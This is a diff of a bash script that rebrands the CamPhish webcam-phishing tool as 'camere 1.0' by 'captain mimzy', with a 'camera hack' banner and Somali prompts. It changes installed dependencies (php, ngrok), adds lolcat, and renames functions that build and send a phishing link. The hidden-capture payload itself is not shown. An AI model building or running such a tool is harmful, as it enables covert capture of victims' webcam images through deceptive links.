@@ -1,26 +1,15 @@
-#!/bin/bash
-# CamPhish v1.5
-# Powered by TechChip
-# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
+# camere 1.0
+# captain mimzy
+# waxa sameyay qof somali ah
 
 trap 'printf "\n";stop' 2
-pkg-get install wget
-pkg install wget
-pkg-get upgrade wget
-pkg upgrade wget
-pkg install php
-pkg install figlet
-pkg install lolcat
-apt update
-apt upgrade -y
-apt install curl -y
-apt install openssh -y
-apt install php -y
-apt install unzip -y
+sudo apt install php
+Y
+sudo apt install ngrok
 
 banner() {
 clear
-figlet -f banner "captain mimzy"
+figlet -f banner "captain mimzy" | lolcat
 printf " \e[1;93m camera hack \e[0m \n"
 printf " \e[1;77m tiktok: captain mimzy | Email: abdirahmanmustafaabdilahi@gmail.com \e[0m \n"
 
@@ -149,7 +138,7 @@ printf "\e[1;93m [!] masha qaynayo fadlan markale kuceli\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+camera
 else
 printf "\n-----doro nocadrabto----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m dawasho been ah\e[0m\n"
@@ -243,7 +232,7 @@ payload_ngrok
 checkfound
 }
 
-camphish() {
+camera() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -266,7 +255,7 @@ else
 printf "\e[1;93m [!] Xulasho aan sax ahayn!\e[0m\n"
 sleep 1
 clear
-camphish
+camera
 fi
 
 }
@@ -313,4 +302,4 @@ checkfound
 
 banner
 dependencies
-camphish
+camera
